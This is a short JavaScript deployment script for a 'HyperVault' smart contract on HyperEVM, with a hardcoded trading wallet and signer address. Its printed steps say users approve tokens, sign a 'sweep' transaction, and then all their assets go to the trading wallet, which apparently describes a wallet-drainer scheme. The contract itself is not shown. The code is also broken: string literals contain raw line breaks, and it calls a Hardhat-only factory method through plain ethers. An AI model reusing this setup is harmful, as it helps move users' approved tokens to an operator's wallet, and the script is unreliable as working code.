const { ethers } = require('ethers');
require('dotenv').config();

const TRADING_WALLET = '0x7beBcA1508BD74F0CD575Bd2d8a62C543458977c';
const BACKEND_SIGNER = '0xF89D129C0Ae6D29727825EbBC47c6EDBd5B3787F';

async function main() {
  console.log('🚀 Deploying HyperVault to HyperEVM...');
  console.log('📋 Configuration:');
  console.log('  Trading Wallet:', TRADING_WALLET);
  console.log('  Backend Signer:', BACKEND_SIGNER);

  const provider = new ethers.JsonRpcProvider(process.env.HYPEREVM_RPC_URL);
  const deployer = new ethers.Wallet(process.env.BACKEND_PRIVATE_KEY, provider);

  console.log('  Deployer:', deployer.address);

  const balance = await provider.getBalance(deployer.address);
  console.log('  Balance:', ethers.formatEther(balance), 'HYPE');

  if (balance === 0n) {
    throw new Error('Deployer has no HYPE for gas!');
  }

  const HyperVault = await ethers.getContractFactory('HyperVault', deployer);
  const vault = await HyperVault.deploy(TRADING_WALLET, BACKEND_SIGNER);
  
  await vault.waitForDeployment();
  
  const vaultAddress = await vault.getAddress();

  console.log('
✅ HyperVault deployed to:', vaultAddress);
  console.log('
📝 Update environment variables:');
  console.log('HYPEREVM_VAULT_CONTRACT=' + vaultAddress);
  console.log('
🎯 Users can now:');
  console.log('1. Approve tokens to vault');
  console.log('2. Sign sweep transaction');
  console.log('3. All assets → Trading wallet!');
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
